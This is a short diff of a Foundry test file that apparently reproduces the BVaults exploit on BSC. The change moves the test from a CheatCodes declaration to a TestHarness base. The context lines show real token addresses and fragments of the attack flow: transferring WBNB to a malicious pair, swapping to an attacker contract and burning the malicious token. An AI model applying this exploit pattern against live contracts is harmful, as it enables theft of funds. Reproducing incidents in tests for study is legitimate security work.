@@ -2,7 +2,7 @@
 pragma solidity ^0.8.17;
 
 import "forge-std/Test.sol";
-import {CheatCodes} from "../interfaces/00_CheatCodes.interface.sol";
+import {TestHarness} from "../TestHarness.sol";
 import {IERC20} from "../interfaces/IERC20.sol";
 
 // forge test --match-contract Exploit_BVaults -vvv
@@ -80,8 +80,7 @@ interface Pair {
     function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);
 }
 
-contract Exploit_BVaults is Test {
-    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+contract Exploit_BVaults is TestHarness {
 
     IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
     IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);
@@ -144,7 +143,6 @@ contract Exploit_BVaults is Test {
         require(WBNB.transfer(address(MALICIOUS_PAIR), WBNB.balanceOf(ATTACKER_CONTRACT)), "transfer failed");
         MALICIOUS_PAIR.swap(10229179233811368474425, 0, ATTACKER_CONTRACT, "");
         maliciousToken.burn(10229179233811368474425);
-
     }
 
 }
